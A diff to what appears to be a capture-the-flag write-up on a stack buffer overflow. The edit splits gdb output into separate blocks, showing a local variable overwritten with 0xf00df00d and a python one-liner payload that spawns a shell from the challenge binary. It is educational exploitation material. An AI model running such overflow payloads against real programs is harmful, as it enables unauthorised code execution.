@@ -126,12 +126,22 @@ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 What is your favorite dish ? 
 
 Breakpoint 1, 0x00005555555551c3 in vuln ()
+```
+
+Now let's inspect the stack :
+
+```gdb
 (gdb) x/20wx $rsp
 0x7fffffffda20:	0x41414141	0x41414141	0x41414141	0x41414141
 0x7fffffffda30:	0x41414141	0x41414141	0x41414141	0x41414141
 0x7fffffffda40:	0x41414141	0x41414141	0x41414141	0xf00df00d
 0x7fffffffda50:	0xffffda00	0x00007fff	0x5555522b	0x00005555
 0x7fffffffda60:	0xffffdb88	0x00007fff	0x00000000	0x00000001
+```
+
+We can see that the local_c variable has been modified. Let's resume execution and see what happens :
+
+```gdb
 (gdb) continue
 Continuing.
 Damn that's a good one !
@@ -141,7 +151,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x0000000000000000 in ?? ()
 ```
 
-We can see in the stack that the variable has been modified, and by resuming execution after the breakpoint the program does reach the success message and open another process.  
+The program does reach the success message and open another process.  
   
 Let's test our payload on the binary using the intruction `(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee)` to input our payload, and then freeze the shell before it closes :
 
